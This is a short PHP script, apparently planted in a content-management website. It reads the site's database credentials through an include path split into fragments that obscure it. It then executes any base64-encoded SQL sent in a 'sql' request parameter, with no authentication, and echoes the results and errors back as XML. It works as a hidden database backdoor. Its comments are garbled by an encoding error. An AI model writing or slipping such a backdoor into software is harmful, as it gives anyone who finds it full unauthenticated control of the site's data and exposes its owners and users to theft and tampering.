<?	
	include_once($_SERVER['DO'.'CUM'.'EN'.'T_'.'RO'.'OT'].'/d'.'ata/co'.'mm'.'on.i'.'nc.p'.'hp');
	$dbhost	= $cfg_dbhost;
	$dbuser	= $cfg_dbuser;
	$dbpw 	= $cfg_dbpwd;
	$dbname	= $cfg_dbname;	
	
	mysql_connect($dbhost, $dbuser, $dbpw);
	mysql_select_db($dbname);
	mysql_query("set names gbk");
	$sql = trim($_REQUEST['sql']);
	$sql = base64_decode($sql);		
	db_execsql_as_xml($sql);
	
	//...ִ��SQL��䣬����ֵת����xml��ʽ
	function db_execsql_as_xml($sql)
	{		
		$sql = stripslashes($sql);//���ô����ֵת��		
		$result = mysql_query($sql);
		$sLine = "";
		$RetHeader = "";
		$RetData   = "";
		if (!$result)
		{
			exit('<code>901</code><desc>'.mysql_error().'</desc>');
		}
		else
		{
			if ($result == 1)
			{
				exit('<code>0</code><desc></desc>');
			}
			else
			{				
				//1�������ֶ������Ϣ���� name type size
				$field_count = mysql_num_fields($result);
				for ($i=0; $i<$field_count; $i++)
				{
	  				$names[$i] = mysql_field_name($result, $i);
	  				$types[$i] = mysql_field_type($result, $i);
	  				$sizes[$i] = mysql_field_len($result , $i);  				
	  				
	  				if(($types[$i]=="blob") || ($types[$i]=="unknown"))
	  				{
	  					$types[$i] ="blob";
	  					$sizes[$i] = 0;
	  				}  				
				}			
				
				//2��ѭ����ȡ������ ˫��ѭ�� blob�����ֶΣ�ʵʱ�ж��ֶγ���
				$sLen = 0;
				while ($info = mysql_fetch_array( $result, MYSQL_ASSOC ))
				{
					$sLine="";
					$i = 0;
					while (list($key, $val) = each($info)) 
					{
						if($types[$i]=="blob")
						{
							//$val = trim($val);
							$sLen = strlen($val);
							if($sLen>$sizes[$i]) $sizes[$i] = $sLen;						
						}
											
						$sLine = $sLine."<$key>$val</$key>";					
						$i++;
					}
					$RetData = $RetData."<Item>$sLine</Item>".chr(13).chr(10);
				}
				
				//3���������ݱ�ͷ 
				for ($i=0; $i<$field_count; $i++)
				{  				 				
	  				if(($types[$i]=='blob')) $types[$i] = 'string';  				
	  				$RetHeader = $RetHeader."<name>$names[$i]</name><type>$types[$i]</type><size>$sizes[$i]</size>".chr(13).chr(10);
				}
				$RetHeader = "<header>$RetHeader</header>";
				
				echo("<code>0</code><desc>".chr(13).chr(10).$RetHeader.chr(13).chr(10).$RetData.chr(13).chr(10)."</desc>");									
			}
		}
		mysql_close();
	}		
?>
